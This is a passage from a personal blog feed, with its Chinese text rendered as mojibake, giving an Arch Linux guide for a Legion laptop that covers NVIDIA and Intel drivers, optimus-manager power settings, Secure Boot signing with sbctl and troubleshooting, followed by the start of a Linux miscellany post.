2022ç‰ˆæœ¬ã€‚</p><blockquote><p>è¿™ä¸ä¸€å®šé€‚ç”¨äºä½ çš„ç¬”è®°æœ¬å’Œæ˜¾å¡ï¼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                  -`                    zjw1nd@MATRIX-02-B </span><br><span class="line">                 .o+`                   ------------------ </span><br><span class="line">                `ooo/                   OS: Arch Linux x86_64 </span><br><span class="line">               `+oooo:                  Host: 82TF Legion Y9000X IAH7 </span><br><span class="line">              `+oooooo:                 Kernel: 6.13.4-arch1-1 </span><br><span class="line">              -+oooooo+:                Uptime: 3 hours, 2 mins </span><br><span class="line">            `/:-:++oooo+:               Packages: 1033 (pacman) </span><br><span class="line">           `/++++/+++++++:              Shell: zsh 5.9 </span><br><span class="line">          `/++++++++++++++:             Resolution: 2560x1440 </span><br><span class="line">         `/+++ooooooooooooo/`           DE: Plasma 6.3.1 </span><br><span class="line">        ./ooosssso++osssssso+`          WM: KWin </span><br><span class="line">       .oossssso-````/ossssss+`         Theme: Breeze-Dark [GTK2], Breeze [GTK3] </span><br><span class="line">      -osssssso.      :ssssssso.        Icons: breeze-dark [GTK2/3] </span><br><span class="line">     :osssssss/        osssso+++.       Terminal: konsole </span><br><span class="line">    /ossssssss/        +ssssooo/-       Terminal Font: FiraCode Nerd Font 10 </span><br><span class="line">  `/ossssso+/:-        -:/+osssso+-     CPU: 12th Gen Intel i7-12700H (20) @ 4.600GHz </span><br><span class="line"> `+sso+:-`                 `.-/+oso:    GPU: Intel Alder Lake-P GT2 [Iris Xe Graphics] </span><br><span class="line">`++:.                           `-/+/   GPU: NVIDIA GeForce RTX 3060 Mobile / Max-Q </span><br><span class="line">.`                                 `/   Memory: 6705MiB / 39850MiB</span><br></pre></td></tr></table></figure><h2 id="é¦–å…ˆï¼Œå®‰è£…æ ¸æ˜¾å’Œnå¡çš„é©±åŠ¨">é¦–å…ˆï¼Œå®‰è£…æ ¸æ˜¾å’Œnå¡çš„é©±åŠ¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></pre></td></tr></table></figure><p><font color=red>âš ï¸å†æ¬¡å¼ºè°ƒï¼Œè‹±ä¼Ÿè¾¾çš„é—­æºé©±åŠ¨æ˜¯å’Œå†…æ ¸ç‰ˆæœ¬å¼ºç»‘å®šçš„ï¼Œè¯·ä¸€å®šåœ¨å®‰è£…nå¡é©±åŠ¨å‰æ‰§è¡Œpacman Syuæ“ä½œï¼å¦åˆ™ä¼šå‡ºç°å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜</font></p><p><strong>å¦‚æœä½ ä¸ç¡®å®šï¼Œåˆ™å…ˆä¸è¦æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</strong>ï¼Œå…ˆå‘åçœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils # å¿…é¡»å®‰è£…</span><br><span class="line">nvidia-smi #æ£€æŸ¥ï¼Œè¾“å‡ºåœ¨gpuä¸Šå·¥ä½œçš„è¿›ç¨‹</span><br><span class="line">lspci | grep -i vga #æ£€æŸ¥ï¼Œçœ‹ä½ çš„æ˜¾å¡é©±åŠ¨ï¼Œè¿™ä¸ªå¯ä»¥æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>å®‰è£…åï¼Œå…ˆå°†kmsä»<code>/etc/mkinitcpio.conf</code>é‡Œçš„HOOKSç§»é™¤å¹¶é‡æ–°ç”Ÿæˆinitramfs,å³<code>mkinitcpio -P</code>ã€‚è¿™æ ·å¯ä»¥é¿å…initramfsåŒ…å«nouveauã€‚æˆ‘ä¸ªäººçš„ç¯å¢ƒé‡è£…åæ‰§è¡Œåˆ°è¿™é‡Œå°±å¯ä»¥äº†ã€‚</p><p>3060 mobileæ˜¯ä¸€ä¸ªå¾ˆå°¬çš„ç‰ˆæœ¬ã€‚æˆ‘ä¸ªäººåœ¨æ›´æ–°å†…æ ¸åç›´æ¥å®‰è£…äº†nvidia-openåŒ…å°±æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯è¿‡ç¨‹ä¸­è¸©äº†ä¸€ä¸‡ä¸ªå‘ï¼Œç°åœ¨ï¼Œä¸‹é¢æ˜¯ä¸€äº›å¤‡é€‰çš„è§£å†³æ–¹æ³•ï¼Œæˆ‘ä¸ç¡®å®šå“ªäº›æœ‰ç”¨ä½†æä¾›åœ¨è¿™é‡Œã€‚åŒæ—¶å»ºè®®nå¡ä½¿ç”¨xorgæ˜¾ç¤ºæœåŠ¡å™¨ï¼Œnå¡å¯¹waylandçš„æ”¯æŒå¹¶ä¸ç®—å¥½ï¼Œwaylandä¸»è¦æ˜¯æµç•…åŠ¨ç”»å’Œhdrï¼Œå¦‚æœéœ€è¦waylandåˆ™ç»§ç»­å‘åçœ‹ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>æ— è®ºæ€ä¹ˆè£…nvidia-smiéƒ½æ˜¾ç¤ºè¿æ¥ä¸åˆ°é©±åŠ¨â€”â€”å¾ˆå¯èƒ½æ˜¯ä¸Šé¢è¯´çš„å†…æ ¸ç‰ˆæœ¬çš„é—®é¢˜</p></li><li class="lvl-2"><p>æ·»åŠ å†…æ ¸å‚æ•°<code>ibt=off</code>ï¼Œå¦‚æœä½ ä½¿ç”¨äº†grubï¼Œåˆ™ç¼–è¾‘<code>/etc/default/grub</code>ä¸­çš„å†…æ ¸å‚æ•°<code>CMDLINE_DEFAULT</code>.å¦‚æœæ²¡æœ‰ï¼Œåˆ™å‚è€ƒarchlinux wikiä¸Šçš„<a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">å†…æ ¸å‚æ•°</a>é¡µé¢è¿›è¡Œé…ç½®ï¼Œæœ‰å¾ˆå¤šåŠæ³•ã€‚è¿™æ˜¯intelçš„ä¸€ä¸ªé—´æ¥è·³è½¬æ§åˆ¶æµä¿æŠ¤æœºåˆ¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯åªå…è®¸<code>jmp rax</code>è¿™æ ·çš„æŒ‡ä»¤åœ¨æ ¸æ€è·³åˆ°æ ‡è®°è¿‡çš„ä½ç½®ã€‚</p></li><li class="lvl-2"><p>å®‰è£…åå‘ç°nå¡é©±åŠ¨è¿˜æ˜¯å¼€æºé©±åŠ¨nouveauâ€”â€”archè‡ªå¸¦äº†å¼€æºé©±åŠ¨nouveauï¼Œæ‰èƒ½ç‚¹äº®æ¡Œé¢çš„ã€‚nå¡åº”è¯¥é»˜è®¤ä¼šå±è”½nouveauï¼Œå¦‚æœæ²¡æœ‰å¯ä»¥å¸è½½nouveauï¼Œå¹¶åœ¨å†…æ ¸å‚æ•°ä¸­æ·»åŠ é»‘åå•ç¦æ­¢nouveauçš„åŠ è½½ã€‚å†…æ ¸å¯åŠ¨å‚æ•°æ·»åŠ <code>module_blacklist=nouveau</code>ç„¶åæ›´æ–°grubã€‚æˆ–åœ¨<code>/etc/modprobe.d</code>ä¸­åˆ›å»ºä¸€ä¸ª<code>blacklist.conf</code>ï¼Œæ·»åŠ </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œç±»ä¼¼çš„æ€æƒ³å¯ä»¥ç”¨äºå¾ˆå¤šåœ°æ–¹ï¼Œä¹Ÿå¯ä»¥åå‘è®©nouveauå¼€å¯ã€‚</p><ul class="lvl-0"><li class="lvl-2"><p>å¦‚æœä½ ä¸æ˜¯ç”¨çš„â€œlinuxâ€å†…æ ¸ï¼Œè€Œæ˜¯linux-zenæˆ–è€…linux-ltsï¼Œåˆ™å®‰è£…å¯¹åº”é©±åŠ¨ï¼Œå°†nvidia-openæ›¿æ¢ä¸º<code>nvidia-open-lts,nvida-open-zenæˆ–nvidia-open-dkms</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒdkmsåŒ…æ˜¯ä¸€ä¸ªä¸å’Œå†…æ ¸ç»‘å®šçš„é©±åŠ¨ï¼Œåœ¨å…¶ä»–é©±åŠ¨é‡åˆ°é—®é¢˜ä¹‹åä¹Ÿå¯ä»¥å†æ¥å°è¯•è¿™ä¸ªé©±åŠ¨ã€‚dkmséœ€è¦å†…æ ¸å¯¹åº”çš„linuxheaderï¼Œä¸€èˆ¬ä¼šä½œä¸ºä¾èµ–ä¸€èµ·å®‰è£…ã€‚</p></li><li class="lvl-2"><p>å¦‚æœä½ éœ€è¦Waylandï¼Œè¿˜éœ€è¦å¯ç”¨ä¸¤ä¸ªnvidia_drmçš„ä¸¤ä¸ªå†…æ ¸å‚æ•°ï¼šmodesetå’Œfbdevï¼ŒäºŒè€…åœ¨æ–°çš„nvidiaé©±åŠ¨åŒ…ä¸­è¢«é»˜è®¤å¯ç”¨ï¼Œä½†è¿˜æ˜¯å»ºè®®è‡ªå·±åœ¨å†…æ ¸å‚æ•°æ·»åŠ ä¸€ä¸‹ã€‚</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/nvidia_drm/parameters/fbdev # æ£€æŸ¥ï¼Œå¤±è´¥è¿”å›ç¼ºå°‘æ–‡ä»¶</span><br><span class="line">cat /sys/module/nvidia_drm/parameters/modeset # æ­£ç¡®è¿”å›Y</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šéƒ½æ²¡èƒ½è§£å†³çš„è¯ï¼Œæ›´å¤šçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒarchlinuxwikiä¸Šçš„<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA">NVIDIA</a>å’Œ<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">NVIDIA/æ•…éšœæ’é”™</a></p><h2 id="åŒæ˜¾å¡é…ç½®">åŒæ˜¾å¡é…ç½®</h2><p>æˆ‘ä¸ªäººä½¿ç”¨äº†optimus-managerï¼Œæ‰€ä»¥æ¨èè¿™ä¸ªã€‚envycontrolæŠŠæˆ‘ç”µè„‘æ•´å´©æºƒäº†æ‰€ä»¥ä¸ªäººä¸æ¨èï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥è¯•è¯•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl enable optimus-manager.service</span><br></pre></td></tr></table></figure><p>è¿™æ—¶é‡å¯åº”è¯¥å°±èƒ½ä½¿ç”¨optimus-manageräº†ã€‚<br><font color=lightyellow>âš ï¸æ³¨æ„ï¼Œå¦‚æœä½ å¯¹ä½ çš„ç¯å¢ƒæ²¡æœ‰è‡ªä¿¡ï¼ˆæ¯”å¦‚æˆ‘ï¼‰ï¼Œä¸€å®šè¦åœ¨æ¯æ¬¡åˆ‡æ¢æ˜¾å¡å®Œåæ‰‹åŠ¨æ³¨é”€ä¸€æ¬¡è§‚å¯Ÿæ˜¯å¦æ­£å¸¸å†å…³æœºï¼Œä¸è¦åˆ‡æ¢åç›´æ¥å…³æœºï¼Œå¦åˆ™å¯èƒ½ä¼šè«åå…¶å¦™çš„é»‘å±</font>æ›´å¤šçš„ä¸æ¸¸æˆè¿è¡Œï¼ŒåŒæ˜¾å¡åŠ¨æ€å·¥ä½œåˆ‡æ¢ç›¸å…³çš„å¯ä»¥å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/graphic-driver.html">ç®€æ˜æŒ‡å—</a></p><p>ç„¶åæ˜¯ç”µæºç­–ç•¥ï¼Œå¯¹äºåŒæ˜¾å¡ï¼Œå¦‚æœä¸åšæ‰‹åŠ¨ç”µæºç­–ç•¥é…ç½®ï¼Œä¸€èˆ¬æ¥è¯´å°±ç®—åˆ‡æ¢åˆ°é›†æ˜¾æ¨¡å¼ï¼Œæ²¡æœ‰biosç¦ç”¨ç‹¬æ˜¾çš„è¯ï¼Œå®ƒä¹Ÿä¼šä¸€ç›´å·¥ä½œè€—ç”µï¼Œå¾ˆsbã€‚å› æ­¤éœ€è¦æˆ‘ä»¬é…ç½®optimusçš„ç”µæºç­–ç•¥ã€‚æˆ‘ä¸ªäººå°è¯•è¿‡çš„æœ‰ä¸¤ç§ï¼Œbbswitchç­–ç•¥åœ¨åˆ‡æ¢é›†æ˜¾å…³æœºåå†å¼€tty2å°±é»‘å±äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆä¿®ï¼Œtty3èƒ½ç”¨ï¼Œåæ­£åˆšè£…å¥½æ²¡å¤šä¹…å°±é‡è£…äº†ã€‚</p><blockquote><p>é‡è£…æ˜¯è§£å†³archå¾ˆå¤šé—®é¢˜æœ€å¿«çš„æ–¹æ¡ˆï¼ˆï¼‰</p></blockquote><p>å¯¹äºç”µæºç­–ç•¥ï¼Œè¯·å‚è€ƒoptimus-managerçš„<a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">å®˜æ–¹æ–‡æ¡£</a>ï¼Œå¹¶ä¸”ä¸€å®šè¦<strong>çœ‹å®Œ</strong>ã€‚æˆ‘é‡‡ç”¨çš„ç­–ç•¥å°±æ˜¯ç¬¬ä¸€æ¡ï¼Œé¦–å…ˆå°†optimus-managerçš„ç”µæºç­–ç•¥è®¾ç½®ä¸ºcustom,ç„¶åæ‰¾åˆ°å®ƒçš„é…ç½®æ–‡ä»¶<code>/etc/optimus-manager/optimus-manager.conf</code>ï¼Œå°†nvidiaä¸‹çš„å‚æ•°è®¾ç½®è¿™ä¸€æ¡<code>dynamic_power_management=fine</code>å³å¯ã€‚è¿™æ—¶ï¼Œnå¡è‡ªå¸¦çš„ç”µæºç­–ç•¥ä¼šæ ¹æ®å…¶å‚æ•°è®¾ç½®ï¼ˆfine: çŸ­æ—¶é—´æ²¡æœ‰è¿›ç¨‹å‘gpuæäº¤ä½œä¸šåè¿›å…¥ä½åŠŸè€—ï¼›coarse: æ²¡æœ‰åº”ç”¨ä½¿ç”¨nå¡é©±åŠ¨åè¿›å…¥ä½åŠŸè€—ï¼Œå‚è€ƒ<a href="https://github.com/Askannz/optimus-manager/blob/master/optimus-manager.conf">é»˜è®¤é…ç½®çš„æ³¨é‡Š</a>ï¼‰é™ä½è‡ªå·±çš„åŠŸè€—ï¼Œè¿™æ—¶å¯ä»¥ä¸€ç›´å¼€hybridæ¨¡å¼ã€‚æ³¨æ„ï¼Œè¿™ä¸€åŠŸèƒ½éœ€è¦nå¡æ”¯æŒï¼Œè¯·é€šè¿‡:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/driver/nvidia/gpus/0000:01:00.0/power</span><br><span class="line"># Runtime D3 status: xxxä¼šæ˜¾ç¤ºæ˜¯å¦æ”¯æŒ</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹æ˜¯å¦æ”¯æŒã€‚</p><p>è¿™ä¸€æ–¹æ¡ˆè‡ªå·±çš„å®æµ‹ï¼Œnvidia-smiä¼šæ˜¾ç¤ºæ˜¾å¡offï¼ŒåŠŸç‡å¤§æ¦‚ä¼šé™ä½åˆ°20wå·¦å³ï¼Œæ²¡æœ‰å®Œå…¨å…³é—­ã€‚ä¸è¿‡é…åˆTLPï¼ŒåŸºæœ¬ä¸Šä¸Šè¯¾ä¸€ä¸ªåŠå°æ—¶è·‘linuxåŸºæœ¬ä¸æ‰ç”µï¼Œå¾ˆæ— æ•Œï¼Œè–„çº±windowsã€‚</p><p><font color=red>âš ï¸æ³¨æ„ï¼Œç”µæºç­–ç•¥æ˜¯éå¸¸â€œä¸ªæ€§åŒ–â€çš„ï¼Œéœ€è¦å°è¯•ï¼Œè¯·ç¡®ä¿æ›´æ”¹å‰åšå¤‡ä»½ï¼Œæˆ–æ˜¯ä¿ç•™äº†é‡è£…çš„livecdï¼Œæˆ‘å°±æ˜¯åœ¨bbswitché»‘å±äº†é‡è£…çš„</font></p><h1>å®‰å…¨å¯åŠ¨</h1><p>å¯ä»¥ç»“åˆ<a href="https://zjw1nd.github.io/2025/2/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">è¿™ç¯‡</a>ä¸€èµ·çœ‹</p><p>å¦‚æœç”±äºæŸäº›åŸå› ï¼ˆæŒ‡ç“¦æ´›å…°ç‰¹å›½é™…æœåä½œå¼Švanguardï¼‰ä½ éœ€è¦å¹³å¸¸å¼€å¯å®‰å…¨å¯åŠ¨ï¼Œåˆ™å¯ä»¥å‚è€ƒè¿™é‡Œã€‚ä¸Šé¢çš„blogä¸­æä¾›äº†è‡ªå·±æ‰‹åŠ¨ç­¾åå†…æ ¸å¹¶å†™å…¥uefiçš„åŠæ³•ï¼Œ</p><p>å¯¹äºarchï¼Œæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„è½¯ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sbctl</span><br></pre></td></tr></table></figure><p><font color=lightyellow>âš ï¸æ³¨æ„ï¼Œè¿™ä¸€è½¯ä»¶æœªå¿…å¯¹æ‰€æœ‰çš„ç¡¬ä»¶ç¯å¢ƒéƒ½æœ‰æ•ˆï¼Œå¯èƒ½ä»ç„¶éœ€è¦æ‰‹åŠ¨ç­¾å</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sbctl create-keys</span><br><span class="line">sbctl enroll-keys -m # å¯†é’¥å’Œå¾®è½¯çš„ä¸€èµ·ç™»å…¥uefi</span><br><span class="line">sbctl verify</span><br><span class="line">sbctl sign -s /boot/vmlinuz-linux</span><br><span class="line">sbctl sign -s /boot/EFI/BOOT/BOOTX64.EFI #  ç­¾ç½²ç›¸å…³å†…å®¹</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨sbctlçš„å¥½å¤„æ˜¯ï¼Œå…¶è‡ªå¸¦ä¸€ä¸ªèƒ½å¤Ÿåœ¨å†…æ ¸æ›´æ–°åç­¾ç½²çš„pacmanhookï¼Œçœäº‹ã€‚</p><p>æ›´å¤šå†…å®¹ä»¥åŠè‡ªå·±æ‰‹åŠ¨ç­¾åçš„ç»†èŠ‚æ“ä½œï¼Œè¯·å‚è€ƒArchWikiçš„<a href="https://wiki.archlinuxcn.org/wiki/UEFI/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8">å®‰å…¨å¯åŠ¨</a>éƒ¨åˆ†ã€‚</p><h1>ä¸€äº›å…³é”®çš„é…ç½®ï¼š</h1><h2 id="grub">grub</h2><p>/etc/default/grub<br>æ›´æ”¹åä½¿ç”¨grub-mkconfigé‡æ–°ç”Ÿæˆå¼•å¯¼</p><h2 id="sddm">sddm</h2><p>é»˜è®¤åœ¨/etc/sddm.conf.dç›®å½•ä¸‹</p><h2 id="pacman">pacman</h2><p>é•œåƒ /etc/pacman.d/mirrorlist<br>é…ç½® /etc/pacman.conf</p><h2 id="zsh-bash">zsh/bash</h2><p>~/.bashrcæˆ–.zshrc</p><h2 id="å…¶ä»–">å…¶ä»–</h2><p>ç¬¬ä¸‰æ–¹åº”ç”¨ï¼š/opt<br>è‡ªå®šä¹‰ç›¸å…³ï¼š/usr/share<br>systemctl å‘½ä»¤<br>mountå‘½ä»¤ç”¨-oæŒ‡å®šæŒ‚è½½å‚æ•°ï¼Œ-tæŒ‡å®šåˆ†åŒºï¼Œç”¨df -hæŸ¥çœ‹æŒ‚è½½æƒ…å†µï¼Œfdisk -læŸ¥çœ‹ç£ç›˜æƒ…å†µ</p><h1>é€šç”¨æ’é”™</h1><h2 id="journalctl">journalctl</h2><p>journalctlå‘½ä»¤å¯ä»¥è¾“å‡ºsystemdçš„æ—¥å¿—ï¼Œå‚è€ƒå¸®åŠ©å‚æ•°ï¼Œå…¶å¯ä»¥è¾“å‡ºå¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬å¯åŠ¨è¿‡ç¨‹ä¸­çš„æ—¥å¿—ã€‚</p><h2 id="Arch-LiveCD">Arch LiveCD</h2><p>ç”¨ä½ çš„å®‰è£…ç›˜ï¼Œå…¶è‡ªå¸¦ä¸€ä¸ªminiçš„archç³»ç»Ÿï¼Œå’Œæˆ‘ä»¬å®‰è£…æ—¶å€™åšçš„ä¸€æ ·ï¼Œå°†ä¸»ç³»ç»ŸæŒ‚è½½åˆ°/mntä¹‹åï¼Œå¯ä»¥åœ¨ä½ çš„ä¸»ç³»ç»Ÿç¿»è½¦ä¹‹åç”¨å…¶ä¿®å¤ã€‚æˆ‘åœ¨å°è¯•æ›¿æ¢è¿è¡Œåº“çš„æ—¶å€™å°†ä¸€ä¸ªä½ç‰ˆæœ¬çš„libm.so.6æ”¾å…¥äº†ç³»ç»Ÿlibåº“ï¼ˆæ”¹åï¼‰ç»“æœå…¨çƒ‚äº†ï¼Œå‘½ä»¤ç”¨ä¸äº†åŠ ç³»ç»Ÿå…³æœºæ— æ³•å¯åŠ¨ï¼Œç›´æ¥æ’ä¸ŠliveCDæ”¹ååæŒ‚è½½æ”¹å›æ¥å°±è¡Œäº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;é¦–å…ˆçš„é¦–å…ˆï¼Œæœ€é‡è¦çš„å‚è€ƒæ¥è‡ªäº&lt;a href=&quot;https://arch.icekylin.online/guide/rookie/pre-install.html&quot;&gt;archlinuxç®€æ˜æŒ‡å—&lt;/a&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h1&gt;å†™åœ¨å‰é¢&lt;/h1&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linuxæ‚è°ˆï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
    <link href="https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/02/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-02-24T08:26:14.000Z</published>
    <updated>2025-03-10T03:12:57.542Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å¯èƒ½éƒ½æ˜¯ä»€ä¹ˆä¹Ÿä¸æ‡‚çš„æ—¶å€™è®°å½•ä¸€äº›äº†è§£åˆ°çš„çŸ¥è¯†ï¼Œkernel pwnä¹Ÿä¼šæ”¾åœ¨linuxè¿™ä¸ªç±»ä¸‹ï¼Œå¯èƒ½ä»¥åå­¦äº†å†…æ ¸pwnä¼šæœ‰ä¸åŒçš„æ„Ÿå—å§ã€‚</p><h2 id="2023-11-26-linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ">2023.11.26 linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ</h2><p>å‚è€ƒ<a href="https://www.runoob.com/linux/linux-system-contents.html">èœé¸Ÿæ•™ç¨‹</a>çš„å†…å®¹ã€‚ç®€å•è°ˆç‚¹ç†è§£ã€‚<br>â€œæ–‡ä»¶æ˜¯å¯¹å­—èŠ‚æµçš„æŠ½è±¡ã€‚â€è€Œlinuxä¹Ÿæ˜¯ä¸€ä¸ªæœ‰ç€â€œä¸€åˆ‡çš†æ–‡ä»¶â€æ€æƒ³çš„ç³»ç»Ÿã€‚è€Œæ— è®ºæ˜¯ä»€ä¹ˆæ ·çš„linuxå‘è¡Œç‰ˆï¼ŒåŸºæœ¬æ ¹ç›®å½•ä¸‹éƒ½æ˜¯é‚£å‡ ä¸ªæ–‡ä»¶å¤¹ã€‚ç®€å•äº†è§£ä¸‹è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä»¥åŠå®ƒæ ¹ç›®å½•ä¸‹é‚£äº›æ–‡ä»¶å¤¹åå­—çš„å«ä¹‰ã€‚ç±»ä¼¼Program Filesè¿™ç§å§ã€‚</p><p>è‰æ–‡ä»¶ç³»ç»Ÿå¥½å¤æ‚ï¼Œä¸å½“äº†ä¸å½“linuxé«˜æ‰‹äº†.jpg</p><h2 id="2024-3-å…³äºlinuxå®‰è£…ã€å†…æ ¸å‡çº§ã€æ˜¾å¡é©±åŠ¨ã€å†…æ ¸ç­¾åç­‰å°æ€»ç»“">2024.3 å…³äºlinuxå®‰è£…ã€å†…æ ¸å‡çº§ã€æ˜¾å¡é©±åŠ¨ã€å†…æ ¸ç­¾åç­‰å°æ€»ç»“</h2><p>è‡ªå·±èŠ±200ä¹°äº†ä¸ªå›ºæ€uç›˜ï¼Œè£…ä¸€æ‰‹linuxï¼Œæ‰“ç®—ææˆä¸€ä¸ªå¹³å¸¸ç”¨çš„ç¯å¢ƒã€‚åŒæ—¶windowsä¸‹è£…äº†kaliçš„wslç‰ˆæœ¬ï¼Œé¡ºå¸¦å‡çº§äº†win11ä¸“ä¸šç‰ˆã€‚</p><p>çœ‹ä¸­çœäº‹çš„é›†æˆå›¾å½¢åŒ–ç•Œé¢+ä¸­æ–‡ç¤¾åŒºè£…äº†deepinï¼Œè¿™ä¸ªè¿‡ç¨‹å¾ˆç®€å•ï¼ŒæŒ‰ç…§å®˜æ–¹æ•™ç¨‹ï¼ˆæœ‰é›†æˆå¥½çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œä¸€ä»¶é…ç½®å®‰è£…å°±å¥½äº†ã€‚<br>è¸©å‘ä¸»è¦æ˜¯æ˜¾ç¤ºæ–¹é¢çš„é—®é¢˜ï¼Œä¸ªäººç¬”è®°æœ¬ä¸€ç›´å¼€å¯çš„ç‹¬æ˜¾ç›´è¿ï¼Œæœ€æ—©çš„æ˜¾å¡é©±åŠ¨æ— æ³•è°ƒèŠ‚äº®åº¦ï¼Œdeepinæºaptå®‰è£…çš„è¯æŠ¥é”™å’Œå†…æ ¸çš„é©±åŠ¨ç‰ˆæœ¬ç‰ˆæœ¬ä¸ç¬¦ï¼Œè€Œä¸”ä»ç„¶æ— æ³•è°ƒèŠ‚äº®åº¦ã€‚å„ç§è¸©å‘å°±è·³è¿‡ï¼Œæ€»ä¹‹è§£å†³è¿‡ç¨‹æ˜¯å»è‹±ä¼Ÿè¾¾å®˜ç½‘ä¸‹è½½å¯¹åº”å‹å·çš„ç”Ÿäº§ç¯å¢ƒé—­æºé©±åŠ¨åå®‰è£…ï¼ˆé€€å‡ºå›¾å½¢åŒ–ç•Œé¢ç„¶åç›´æ¥æ‰¾åˆ°æ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œå‚è€ƒ<a href="https://bbs.deepin.org/zh/post/232923?offset=0&amp;postId=1317417">è¿™ç¯‡æ–‡ç« </a>ã€‚å®‰è£…å¥½ä¹‹åå¼€å¯æ˜¾å¡çš„äº®åº¦è°ƒèŠ‚ï¼Œè·³è¿‡ä¸èƒ½ç”¨çš„æ–¹æ³•ï¼Œå‚è€ƒçš„<a href="https://bbs.deepin.org.cn/zh/post/257837">è¿™ç¯‡</a>ï¼Œconfæ–‡ä»¶ä¸­å¼€å¯<code>EnableBrightnessControl=1</code>ï¼Œä¹Ÿæ˜¯æŒºå¹½é»˜çš„ã€‚</p><p>ç„¶åè‡ªå·±ç¼–è¯‘å‡çº§äº†ä¸€ä¸‹å†…æ ¸ï¼ˆèƒ½è§£å†³ç¬”è®°æœ¬åˆç›–å¾…æœºæ— æ³•å”¤é†’çš„é—®é¢˜ï¼‰ï¼Œæ–°å°±æ˜¯å¥½ï¼ˆé”™ä¹±ï¼‰ã€‚å†…æ ¸ç¼–è¯‘å‚è€ƒ<a href="https://linux.cn/article-16252-1.html">è¿™ç¯‡æ–‡ç« </a>ï¼Œè¯´çš„éå¸¸è¯¦ç»†äº†ã€‚ä½†æ˜¯æ‹¯æ•‘è€…æ— æ³•è¯†åˆ«è‡ªå¸¦éŸ³å“å’Œéº¦å…‹é£çš„é—®é¢˜ä¼¼ä¹è¢«å¿˜è®°äº†â€¦çœ‹åˆ°å†…æ 